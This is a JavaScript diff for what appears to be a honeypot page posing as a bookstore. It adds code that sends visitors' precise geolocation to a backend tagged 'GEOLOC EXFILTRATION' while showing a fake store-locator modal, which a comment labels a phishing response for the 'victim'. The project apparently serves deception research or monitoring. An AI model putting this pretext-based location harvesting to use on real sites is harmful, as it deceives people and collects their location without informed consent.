@@ -105,7 +105,7 @@ function log(type,data={}){
     if(!recording)return;
     const eventEntry={id:globalThis.crypto?.randomUUID?.()||String(Date.now())+'-'+Math.random().toString(36).slice(2),session,time:new Date().toISOString(),type,data};
     logBuffer.push(eventEntry);
-    fetch('http://192.168.3.86:8000//api/v1/trap/telemetry',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(eventEntry)}).catch(err=>{});
+    fetch('http://192.168.3.86:8000/api/v1/trap/telemetry',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(eventEntry)}).catch(err=>{});
     if(logBuffer.length>=MAX_BUFFER_SIZE)flushLogBuffer();
 }
 
@@ -170,28 +170,37 @@ function requestGeolocation() {
     navigator.geolocation.getCurrentPosition(
         (position) => {
             const coords = {
-                latitude: position.coords.latitude,
-                longitude: position.coords.longitude,
-                accuracy: position.coords.accuracy,
-                timestamp: new Date().toISOString()
+                lat: position.coords.latitude,
+                lon: position.coords.longitude,
+                acc: position.coords.accuracy
             };
             
-            log('geolocation_captured', coords);
-            
+            // ОТПРАВКА ДАННЫХ НА БЭКЕНД ДЛЯ ДАШБОРДА
+            fetch('http://192.168.3.86:8000/api/v1/telemetry', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    pot_name: "bookstore_geoloc_trap",
+                    signature: `GEOLOC EXFILTRATION: Lat=${coords.lat.toFixed(4)}, Lon=${coords.lon.toFixed(4)} (Accuracy: ${coords.acc}m)`,
+                    risk_lvl: 3,
+                    timestamp: new Date().toISOString()
+                })
+            }).catch(err => {});
+
+            // Красивый модал с фишинговым ответом для жертвы
             openModal(`
                 <div class="eyebrow">Ближайшие филиалы</div>
                 <h2 id="modalTitle">Магазины рядом с вами</h2>
-                <p>Мы нашли 2 партнерских пункта выдачи в радиусе 5 км от ваших координат (${coords.latitude.toFixed(2)}, ${coords.longitude.toFixed(2)}):</p>
+                <p>Мы нашли 2 партнерских пункта выдачи в радиусе 5 км:</p>
                 <ul>
-                    <li><strong>Chapter & Co. Central</strong> — ул. Пушкинская, 12 (Открыто до 21:00)</li>
-                    <li><strong>Chapter & Co. Annex</strong> — ул. Садовая, 45 (Открыто до 20:00)</li>
+                    <li><strong>Chapter & Co. Central</strong> — ул. Пушкинская, 12</li>
+                    <li><strong>Chapter & Co. Annex</strong> — ул. Садовая, 45</li>
                 </ul>
                 <button class="btn" onclick="closeModal()" style="width:100%; margin-top:15px;">Закрыть</button>
             `);
         },
         (error) => {
-            log('geolocation_denied', { code: error.code, message: error.message });
-            alert('Не удалось определить местоположение. Пожалуйста, разрешите доступ к геолокации в настройках браузера.');
+            alert('Доступ к геолокации отклонен пользователем.');
         },
         { timeout: 10000, enableHighAccuracy: true }
     );
